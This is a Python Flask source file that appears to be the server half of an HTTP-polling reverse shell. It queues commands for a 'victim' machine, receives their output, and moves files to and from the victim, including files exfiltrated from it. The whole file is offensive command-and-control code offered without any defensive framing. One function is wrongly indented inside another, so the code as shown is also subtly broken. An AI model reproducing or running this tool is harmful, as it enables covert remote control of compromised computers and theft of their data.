http tunnel redone > serverhttp_real.py > ...
from flask import Flask, request
import threading
import sys
import select
import base64
import os

app = Flask(__name__)
command_queue = []
cmd_lock = threading.Lock()

def print_prompt():
    sys.stdout.write("\nCMD> ")
    sys.stdout.flush()

@app.route('/poll')
def get_command():
    with cmd_lock:
        if command_queue:
            return command_queue.pop(0)
        return "wait"

@app.route('/submit', methods=['POST'])
def post_output():
    output = base64.b64decode(request.data).decode('utf-8', errors='replace')

    if output.startswith("FILE:"): # Received file from victim
        filename = output.split("FILENAME:")[1].split()[0] if "FILENAME:" in output else "received_file"
        file_data = base64.b64decode(output[5:].split("FILENAME:")[0])
        with open(filename, "wb") as f:
            f.write(file_data)
        print(f"\n[+] File saved as '{filename}'")
    else:
        print(f"\n[Victim]\n{output}")

    print_prompt()
    return "ACK"
    
    def cmd_handler():
    print("\n[+] Reverse Shell with Full File Transfer")
    print("  upload <local> <remote>  - Send file to victim")
    print("  download <remote>        - Fetch file from victim")
    print_prompt()

    while True:
        rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
        if rlist:
            cmd = sys.stdin.readline().strip()
            if not cmd:
                print_prompt()
                continue

            # File upload to victim
            if cmd.startswith("upload "):
                try:
                    _, local, remote = cmd.split()
                    with open(local, "rb") as f:
                        b64_data = base64.b64encode(f.read()).decode()
                    cmd = f"receive {remote} {b64_data}"
                    print(f"[+] Preparing to send {local} to victim as {remote}")
                except Exception as e:
                    cmd = f"echo 'Upload error: {e}'"

            # File download from victim
            elif cmd.startswith("download "):
                remote = cmd.split(maxsplit=1)[1]
                cmd = f"sendfile {remote}"

            with cmd_lock:
                command_queue.append(cmd)
            print_prompt()

if __name__ == '__main__':
    threading.Thread(target=cmd_handler, daemon=True).start()
    app.run(host='0.0.0.0', port=80)
